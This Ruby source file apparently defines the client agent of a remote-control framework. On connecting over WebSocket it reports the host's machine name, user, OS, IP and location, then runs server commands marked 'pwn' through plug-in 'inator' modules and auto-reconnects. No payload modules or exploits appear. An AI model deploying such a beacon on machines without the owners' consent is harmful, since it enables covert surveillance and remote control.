require 'singleton'

class Android
  include Singleton
  attr_accessor :id, :type, :name, :computer, :user, :os, :ip, :country, :city, :status, :inators, :socket
  def initialize
    @id = ''           # unique id
    @type = ''         # slave/master
    @name = ''         # name of client
    @computer = ''     # machine name
    @user = ''         # user
    @os = ''           # operating system
    @ip = ''           # ip address
    @country = ''      # country
    @city = ''         # city
    @status = ''       # online/offline/error
    @inators = []      # inators
    @socket = nil      # socket
  end

  def android
    inators = []
    @inators.each { |inator| inators << { "id" => inator.id, "name" => inator.name } }
    {
      "header" => "android",
      "payload" => {
        "id" => @id,
        "type" => @type,
        "name" => @name,
        "computer" => @computer,
        "user" => @user,
        "os" => @os,
        "ip" => @ip,
        "country" => @country,
        "city" => @city,
        "inators" => inators
      },
      "trailer" => "this is andorid 21 test"
    }.to_json
  end

  def connect
    EM.run {
      @socket.socket = Faye::WebSocket::Client.new(@socket.host)

      @socket.socket.on :open do |event|
        p [:open]
        @socket.socket.send(android)
      end

      @socket.socket.on :message do |event|
        p [:message, event.data]
        begin
          packet = JSON.parse(event.data)

          header = packet['header']       # header
          payload = packet['payload']     # payload
          trailer = packet['trailer']     # trailer

          if header == "pwn" then
            inator = packet['payload']['inator']
            data = packet['payload']['data']
            log = trailer
            input(inator, data, log)
          else
            #disconnect
          end
        rescue Exception => ex
          puts ex
        end
      end

      @socket.socket.on :close do |event|
        p [:close, event.code, event.reason]
        @socket.socket = nil
        if @socket.reconnect_enabled == true then
          sleep @socket.reconnect_interval
          connect
        end
      end
    }
  end

  def disconnect
    @socket.socket.close
  end

  def input(inator, data, log)
    inator = @inators.find { |i| i.id == inator }
    inator.input(data, log)
  end

  def output(inator, data, log)
    packet = {
      "header" => "data",
      "payload" => { "android" => @id, "inator" => inator, "data" => data },
      "trailer" => log
    }.to_json
    @socket.socket.send packet
  end
end
